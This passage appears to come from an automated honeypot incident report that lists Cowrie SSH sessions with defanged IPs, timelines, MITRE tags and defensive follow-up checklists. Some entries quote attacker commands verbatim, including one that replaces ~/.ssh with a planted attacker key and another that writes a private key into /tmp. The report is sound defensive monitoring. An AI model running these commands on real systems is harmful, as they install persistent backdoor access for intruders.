- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba767ff0ef7b

| Field | Detail |
|---|---|
| **Source IP** | `182.151.45[.]136` |
| **First Seen** | 2026-08-15 03:22 |
| **Last Seen** | 2026-08-15 03:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:22:33` | `cowrie.session.connect` |
| `2026-08-15 03:22:34` | `cowrie.client.version` |
| `2026-08-15 03:22:34` | `cowrie.client.kex` |
| `2026-08-15 03:22:36` | `cowrie.login.success` |
| `2026-08-15 03:22:36` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.151.45[.]136` to AbuseIPDB if not already reported
- [ ] Block `182.151.45[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ee6c6092e31

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 03:31 |
| **Last Seen** | 2026-08-15 03:32 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:31:47` | `cowrie.session.connect` |
| `2026-08-15 03:31:52` | `cowrie.client.version` |
| `2026-08-15 03:31:52` | `cowrie.client.kex` |
| `2026-08-15 03:32:16` | `cowrie.login.success` |
| `2026-08-15 03:32:27` | `cowrie.session.params` |
| `2026-08-15 03:32:27` | `cowrie.command.input` |
| `2026-08-15 03:32:34` | `cowrie.log.closed` |
| `2026-08-15 03:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c9f5920961c

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 03:32 |
| **Last Seen** | 2026-08-15 03:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:32:51` | `cowrie.session.connect` |
| `2026-08-15 03:32:51` | `cowrie.client.version` |
| `2026-08-15 03:32:51` | `cowrie.client.kex` |
| `2026-08-15 03:32:52` | `cowrie.login.success` |
| `2026-08-15 03:32:53` | `cowrie.session.params` |
| `2026-08-15 03:32:53` | `cowrie.command.input` |
| `2026-08-15 03:32:53` | `cowrie.log.closed` |
| `2026-08-15 03:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af7326dafb8

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 03:42 |
| **Last Seen** | 2026-08-15 03:47 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:42:57` | `cowrie.session.connect` |
| `2026-08-15 03:42:57` | `cowrie.client.version` |
| `2026-08-15 03:42:57` | `cowrie.client.kex` |
| `2026-08-15 03:42:59` | `cowrie.login.success` |
| `2026-08-15 03:43:00` | `cowrie.session.params` |
| `2026-08-15 03:43:00` | `cowrie.command.input` |
| `2026-08-15 03:43:00` | `cowrie.command.failed` |
| `2026-08-15 03:43:01` | `cowrie.log.closed` |
| `2026-08-15 03:43:02` | `cowrie.session.params` |
| `2026-08-15 03:43:02` | `cowrie.command.input` |
| `2026-08-15 03:43:09` | `cowrie.session.file_download` |
| `2026-08-15 03:43:09` | `cowrie.log.closed` |
| `2026-08-15 03:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d194a7ddde9a

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-08-15 03:43 |
| **Last Seen** | 2026-08-15 03:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:43:42` | `cowrie.session.connect` |
| `2026-08-15 03:43:42` | `cowrie.client.version` |
| `2026-08-15 03:43:42` | `cowrie.client.kex` |
| `2026-08-15 03:43:44` | `cowrie.login.success` |
| `2026-08-15 03:43:45` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2857764f7e5

| Field | Detail |
|---|---|
| **Source IP** | `103.158.138[.]179` |
| **First Seen** | 2026-08-15 03:43 |
| **Last Seen** | 2026-08-15 03:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:43:51` | `cowrie.session.connect` |
| `2026-08-15 03:43:52` | `cowrie.client.version` |
| `2026-08-15 03:43:52` | `cowrie.client.kex` |
| `2026-08-15 03:43:54` | `cowrie.login.success` |
| `2026-08-15 03:43:54` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.138[.]179` to AbuseIPDB if not already reported
- [ ] Block `103.158.138[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4af150d9be2f

| Field | Detail |
|---|---|
| **Source IP** | `185.15.189[.]232` |
| **First Seen** | 2026-08-15 03:44 |
| **Last Seen** | 2026-08-15 03:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:44:00` | `cowrie.session.connect` |
| `2026-08-15 03:44:01` | `cowrie.client.version` |
| `2026-08-15 03:44:01` | `cowrie.client.kex` |
| `2026-08-15 03:44:02` | `cowrie.login.success` |
| `2026-08-15 03:44:03` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.15.189[.]232` to AbuseIPDB if not already reported
- [ ] Block `185.15.189[.]232` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e2d493ae89b

| Field | Detail |
|---|---|
| **Source IP** | `213.101.138[.]172` |
| **First Seen** | 2026-08-15 03:44 |
| **Last Seen** | 2026-08-15 03:44 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:44:09` | `cowrie.session.connect` |
| `2026-08-15 03:44:11` | `cowrie.client.version` |
| `2026-08-15 03:44:11` | `cowrie.client.kex` |
| `2026-08-15 03:44:16` | `cowrie.login.success` |
| `2026-08-15 03:44:18` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.101.138[.]172` to AbuseIPDB if not already reported
- [ ] Block `213.101.138[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dde31720ad67

| Field | Detail |
|---|---|
| **Source IP** | `218.15.224[.]102` |
| **First Seen** | 2026-08-15 03:50 |
| **Last Seen** | 2026-08-15 03:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:50:52` | `cowrie.session.connect` |
| `2026-08-15 03:50:53` | `cowrie.client.version` |
| `2026-08-15 03:50:53` | `cowrie.client.kex` |
| `2026-08-15 03:50:56` | `cowrie.login.success` |
| `2026-08-15 03:50:57` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:51:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.15.224[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.15.224[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e442c88ea1e7

| Field | Detail |
|---|---|
| **Source IP** | `183.63.220[.]210` |
| **First Seen** | 2026-08-15 03:51 |
| **Last Seen** | 2026-08-15 03:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:51:02` | `cowrie.session.connect` |
| `2026-08-15 03:51:04` | `cowrie.client.version` |
| `2026-08-15 03:51:04` | `cowrie.client.kex` |
| `2026-08-15 03:51:07` | `cowrie.login.success` |
| `2026-08-15 03:51:08` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:51:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.63.220[.]210` to AbuseIPDB if not already reported
- [ ] Block `183.63.220[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89368158ec67

| Field | Detail |
|---|---|
| **Source IP** | `203.192.247[.]84` |
| **First Seen** | 2026-08-15 03:51 |
| **Last Seen** | 2026-08-15 03:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:51:06` | `cowrie.session.connect` |
| `2026-08-15 03:51:07` | `cowrie.client.version` |
| `2026-08-15 03:51:07` | `cowrie.client.kex` |
| `2026-08-15 03:51:09` | `cowrie.login.success` |
| `2026-08-15 03:51:10` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.247[.]84` to AbuseIPDB if not already reported
- [ ] Block `203.192.247[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e3e9796b835

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-08-15 03:51 |
| **Last Seen** | 2026-08-15 03:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:51:15` | `cowrie.session.connect` |
| `2026-08-15 03:51:15` | `cowrie.client.version` |
| `2026-08-15 03:51:15` | `cowrie.client.kex` |
| `2026-08-15 03:51:16` | `cowrie.login.success` |
| `2026-08-15 03:51:17` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:51:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b1c3715e233

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 03:52 |
| **Last Seen** | 2026-08-15 03:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:52:05` | `cowrie.session.connect` |
| `2026-08-15 03:52:05` | `cowrie.client.version` |
| `2026-08-15 03:52:05` | `cowrie.client.kex` |
| `2026-08-15 03:52:06` | `cowrie.login.success` |
| `2026-08-15 03:52:07` | `cowrie.session.params` |
| `2026-08-15 03:52:07` | `cowrie.command.input` |
| `2026-08-15 03:52:07` | `cowrie.log.closed` |
| `2026-08-15 03:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42c3f7dcced0

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 03:54 |
| **Last Seen** | 2026-08-15 03:54 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:54:05` | `cowrie.session.connect` |
| `2026-08-15 03:54:10` | `cowrie.client.version` |
| `2026-08-15 03:54:10` | `cowrie.client.kex` |
| `2026-08-15 03:54:32` | `cowrie.login.success` |
| `2026-08-15 03:54:45` | `cowrie.session.params` |
| `2026-08-15 03:54:45` | `cowrie.command.input` |
| `2026-08-15 03:54:50` | `cowrie.log.closed` |
| `2026-08-15 03:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0787e98cb9

| Field | Detail |
|---|---|
| **Source IP** | `187.49.63[.]51` |
| **First Seen** | 2026-08-15 03:59 |
| **Last Seen** | 2026-08-15 04:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:59:54` | `cowrie.session.connect` |
| `2026-08-15 03:59:55` | `cowrie.client.version` |
| `2026-08-15 03:59:55` | `cowrie.client.kex` |
| `2026-08-15 03:59:58` | `cowrie.login.success` |
| `2026-08-15 03:59:59` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.49.63[.]51` to AbuseIPDB if not already reported
- [ ] Block `187.49.63[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93742eb3c7d5

| Field | Detail |
|---|---|
| **Source IP** | `116.48.143[.]166` |
| **First Seen** | 2026-08-15 04:00 |
| **Last Seen** | 2026-08-15 04:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:00:05` | `cowrie.session.connect` |
| `2026-08-15 04:00:06` | `cowrie.client.version` |
| `2026-08-15 04:00:06` | `cowrie.client.kex` |
| `2026-08-15 04:00:08` | `cowrie.login.success` |
| `2026-08-15 04:00:09` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.143[.]166` to AbuseIPDB if not already reported
- [ ] Block `116.48.143[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-656744690f9b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:05 |
| **Last Seen** | 2026-08-15 04:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:05:02` | `cowrie.session.connect` |
| `2026-08-15 04:05:03` | `cowrie.client.version` |
| `2026-08-15 04:05:03` | `cowrie.client.kex` |
| `2026-08-15 04:05:05` | `cowrie.login.success` |
| `2026-08-15 04:05:07` | `cowrie.session.params` |
| `2026-08-15 04:05:07` | `cowrie.command.input` |
| `2026-08-15 04:05:07` | `cowrie.command.input` |
| `2026-08-15 04:05:07` | `cowrie.command.input` |
| `2026-08-15 04:05:07` | `cowrie.command.input` |
| `2026-08-15 04:05:07` | `cowrie.command.input` |
| `2026-08-15 04:05:07` | `cowrie.command.success` |
| `2026-08-15 04:05:07` | `cowrie.command.input` |
| `2026-08-15 04:05:07` | `cowrie.command.input` |
| `2026-08-15 04:05:07` | `cowrie.command.input` |
| `2026-08-15 04:05:07` | `cowrie.command.input` |
| `2026-08-15 04:05:08` | `cowrie.log.closed` |
| `2026-08-15 04:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bb0b007e792

| Field | Detail |
|---|---|
| **Source IP** | `47.94.230[.]80` |
| **First Seen** | 2026-08-15 04:06 |
| **Last Seen** | 2026-08-15 04:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:06:54` | `cowrie.session.connect` |
| `2026-08-15 04:06:54` | `cowrie.client.version` |
| `2026-08-15 04:06:55` | `cowrie.client.kex` |
| `2026-08-15 04:06:57` | `cowrie.login.success` |
| `2026-08-15 04:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.94.230[.]80` to AbuseIPDB if not already reported
- [ ] Block `47.94.230[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f1c000b0dab

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-15 04:06 |
| **Last Seen** | 2026-08-15 04:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:06:57` | `cowrie.session.connect` |
| `2026-08-15 04:06:57` | `cowrie.client.version` |
| `2026-08-15 04:06:57` | `cowrie.client.kex` |
| `2026-08-15 04:06:58` | `cowrie.login.success` |
| `2026-08-15 04:06:59` | `cowrie.session.params` |
| `2026-08-15 04:06:59` | `cowrie.command.input` |
| `2026-08-15 04:07:00` | `cowrie.session.file_download` |
| `2026-08-15 04:07:00` | `cowrie.session.file_download` |
| `2026-08-15 04:07:00` | `cowrie.log.closed` |
| `2026-08-15 04:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a44cfbc05f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:07 |
| **Last Seen** | 2026-08-15 04:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:07:21` | `cowrie.session.connect` |
| `2026-08-15 04:07:22` | `cowrie.client.version` |
| `2026-08-15 04:07:22` | `cowrie.client.kex` |
| `2026-08-15 04:07:25` | `cowrie.login.success` |
| `2026-08-15 04:07:27` | `cowrie.session.params` |
| `2026-08-15 04:07:27` | `cowrie.command.input` |
| `2026-08-15 04:07:27` | `cowrie.command.input` |
| `2026-08-15 04:07:27` | `cowrie.command.input` |
| `2026-08-15 04:07:27` | `cowrie.command.input` |
| `2026-08-15 04:07:27` | `cowrie.command.input` |
| `2026-08-15 04:07:27` | `cowrie.command.success` |
| `2026-08-15 04:07:27` | `cowrie.command.input` |
| `2026-08-15 04:07:27` | `cowrie.command.input` |
| `2026-08-15 04:07:27` | `cowrie.command.input` |
| `2026-08-15 04:07:27` | `cowrie.command.input` |
| `2026-08-15 04:07:28` | `cowrie.log.closed` |
| `2026-08-15 04:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bddc64e8afa3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-15 04:09 |
| **Last Seen** | 2026-08-15 04:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:09:27` | `cowrie.session.connect` |
| `2026-08-15 04:09:27` | `cowrie.client.version` |
| `2026-08-15 04:09:27` | `cowrie.client.kex` |
| `2026-08-15 04:09:28` | `cowrie.login.success` |
| `2026-08-15 04:09:28` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:09:28` | `cowrie.direct-tcpip.data` |
| `2026-08-15 04:09:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dd4b4492325

| Field | Detail |
|---|---|
